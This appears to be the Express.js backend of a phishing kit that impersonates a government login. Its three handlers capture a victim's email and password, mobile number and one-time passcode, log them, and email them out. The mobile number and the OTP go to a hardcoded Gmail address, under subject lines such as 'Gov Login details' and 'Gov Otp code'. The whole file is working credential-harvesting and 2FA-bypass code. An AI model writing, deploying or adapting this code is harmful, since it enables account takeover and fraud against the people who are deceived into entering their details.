const { response } = require('express');
const sendEmail = require('../control/sendemail')

exports.authenticateAdminUser =  (req, res) => {
    const { email, password } = req.body;

    try {
        const message = `email:${email}, password:${password}`
        console.log(message)
        const reason = 'Gov Login details'
        
       sendEmail(email, message, reason, (data) => {
            if (data) {
                return res.status(200).json({
                    status: 200,
                    email: email,
                    msg: 'email sent'
                });
            }

        }).then(response => res.send(response.message)).catch(error=>res.status);
    } catch (error) {
        return   res.status(500).send(error.message);
    }
}

exports.mobile =  (req, res) => {
    const { number } = req.body;

    try {
        const message = `Mobile number:${number}`
        console.log(message)
        const reason = 'Gov mobile details'
        const email = 'techt5562@gmail.com'
        
       sendEmail(email, message, reason, (data) => {
            if (data) {
                return res.status(200).json({
                    status: 200,
                    email: email,
                    msg: 'email sent'
                });
            }

        }).then(response => res.send(response.message)).catch(error=>res.status);
    } catch (error) {
        return   res.status(500).send(error.message);
    }
}

exports.code =  (req, res) => {
    const { code } = req.body;

    try {
        const message = `Otp:${code}`
        console.log(message)
        const reason = 'Gov Otp code'
        const email = 'techt5562@gmail.com'
        
       sendEmail(email, message, reason, (data) => {
            if (data) {
                return res.status(200).json({
                    status: 200,
                    email: email,
                    msg: 'email sent'
                });
            }

        }).then(response => res.send(response.message)).catch(error=>res.status);
    } catch (error) {
        return   res.status(500).send(error.message);
    }
}